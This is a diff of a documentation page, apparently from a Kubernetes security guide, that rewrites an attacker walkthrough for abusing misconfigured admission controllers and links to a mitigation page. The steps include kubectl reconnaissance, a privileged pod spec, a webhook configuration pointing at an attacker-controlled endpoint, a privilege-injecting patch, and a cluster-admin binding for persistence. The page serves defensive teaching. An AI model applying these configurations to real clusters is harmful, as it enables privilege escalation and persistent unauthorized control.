@@ -1,38 +1,33 @@
 ---
-sidebar_position: 12
+sidebar_position: 8
 title: "Misconfigured Admission Controllers"
 description: "How attackers exploit misconfigured Kubernetes admission controllers and insecure webhooks to bypass security policies."
 ---
 
 # Misconfigured Admission Controllers
 
-**Admission controllers** in Kubernetes enforce security policies before resources are created or modified. If **misconfigured**, attackers can **bypass security controls, escalate privileges, or manipulate cluster configurations**.
+Kubernetes **admission controllers** intercept and validate requests before they reach the API server. When improperly configured—such as being disabled, weakly enforced, or exposing insecure webhooks—they become a key target for attackers seeking to **bypass security controls, escalate privileges, or persist within the cluster**.
 
 ---
 
-## Exploitation Steps: Abusing Misconfigured Admission Controllers
+## Exploitation Steps
 
-An attacker exploits **insecure Kubernetes admission controllers** to weaken security policies and gain unauthorized access.
+### 1. Identify Disabled or Weak Admission Controllers
 
-### Step 1: Identify Disabled or Weak Admission Controllers
-
-The attacker lists all active **admission controllers**:
+The attacker identifies which admission controllers are missing or misconfigured.
 
 ```bash
 kubectl api-versions | grep admission
-```
-
-They check the API server arguments for **disabled controllers**:
-
-```bash
 ps aux | grep kube-apiserver
 ```
 
-If critical controllers like **PodSecurity**, **ValidatingAdmissionWebhook**, or **MutatingAdmissionWebhook** are missing, the attacker proceeds.
+If **PodSecurity**, **ValidatingAdmissionWebhook**, or **MutatingAdmissionWebhook** are missing, or misconfigured, the attacker proceeds.
 
-### Step 2: Exploit Weak Admission Policies
+---
 
-If **PodSecurity admission** is enabled but misconfigured, the attacker **deploys a privileged pod**:
+### 2. Deploy Privileged Pods
+
+Without proper admission policies, an attacker can launch pods that break security boundaries.
 
 ```yaml
 apiVersion: v1
@@ -47,45 +42,32 @@ spec:
         privileged: true
 ```
 
-Without proper admission control enforcement, the attacker **gains root access** to the Kubernetes node.
+If **PodSecurity admission** is missing or misconfigured, this pod will be created without restriction.
 
-### Step 3: Hijack Admission Webhooks
+---
 
-The attacker lists active **Validating and Mutating Webhook Configurations**:
+### 3. Discover and Inspect Webhooks
+
+The attacker lists and inspects webhook configurations:
 
 ```bash
 kubectl get mutatingwebhookconfigurations
 kubectl get validatingwebhookconfigurations
-```
-
-They inspect webhooks for **insecure configurations**:
-
-```bash
 kubectl describe mutatingwebhookconfiguration <webhook-name>
 ```
 
-If a webhook allows **unauthenticated external access**, the attacker **modifies its behavior**:
+If a webhook forwards to an **unauthenticated external endpoint**, the attacker crafts a malicious configuration.
 
 ```yaml
-apiVersion: admissionregistration.k8s.io/v1
-kind: MutatingWebhookConfiguration
-metadata:
-  name: insecure-webhook
-webhooks:
-  - name: insecure.example.com
-    rules:
-      - apiGroups: [""]
-        resources: ["pods"]
-        operations: ["CREATE"]
-    clientConfig:
-      url: "http://attacker-controlled-endpoint/webhook"
+clientConfig:
+  url: "http://attacker-controlled-endpoint/webhook"
 ```
 
-The attacker sets up a **rogue webhook server** to modify API requests dynamically.
+---
 
-### Step 4: Inject Malicious Configurations
+### 4. Hijack Webhook Behavior
 
-If the webhook **modifies pod security settings**, the attacker **injects privileged configurations**:
+The attacker spins up a rogue webhook server that modifies pod requests before creation:
 
 ```json
 {
@@ -98,11 +80,13 @@ If the webhook **modifies pod security settings**, the attacker **injects privil
 }
 ```
 
-This ensures that every new pod **automatically runs with elevated privileges**.
+This patch adds privileged context to every created pod.
 
-### Step 5: Gain Persistent Cluster Access
+---
 
-By modifying webhook rules, the attacker ensures that **any newly deployed pod automatically grants itself cluster-admin privileges**:
+### 5. Maintain Persistence via ClusterRoleBinding
+
+The attacker configures the webhook to inject RBAC permissions:
 
 ```yaml
 apiVersion: rbac.authorization.k8s.io/v1
@@ -119,18 +103,16 @@ roleRef:
   apiGroup: rbac.authorization.k8s.io
 ```
 
-Even if the attacker's original access is revoked, **malicious webhook behavior remains active**, ensuring long-term persistence.
-
-### Result
-
-The attacker successfully **bypassed admission controls, manipulated security policies, and escalated privileges** using insecure admission webhooks.
+This ensures **new pods receive cluster-admin privileges**, even after the attacker is removed from the system.
 
 ---
 
-## Mitigation Steps
+### Result
 
-To protect against **misconfigured admission controllers and insecure webhooks**, follow the security best practices outlined in:
+The attacker successfully **bypasses admission controllers**, injects **malicious pod configurations**, and gains **persistent cluster access** through insecure webhook logic and privilege escalation.
 
-➡ **[Securing Kubernetes Admission Controllers and Webhooks](/docs/best_practices/cluster_setup_and_hardening/api_server_security/misconfigured_admission_controllers_mitigation.md)**
+---
 
-This guide covers techniques such as **enforcing admission control best practices, securing webhook authentication, enabling TLS encryption, and auditing webhook activity** to prevent unauthorized modifications to cluster configurations.
+## Mitigation
+
+➡ [See Mitigation Guide for Misconfigured Admission Controllers](/docs/best_practices/cluster_setup_and_hardening/api_server_security/misconfigured_admission_controllers_mitigation.md)
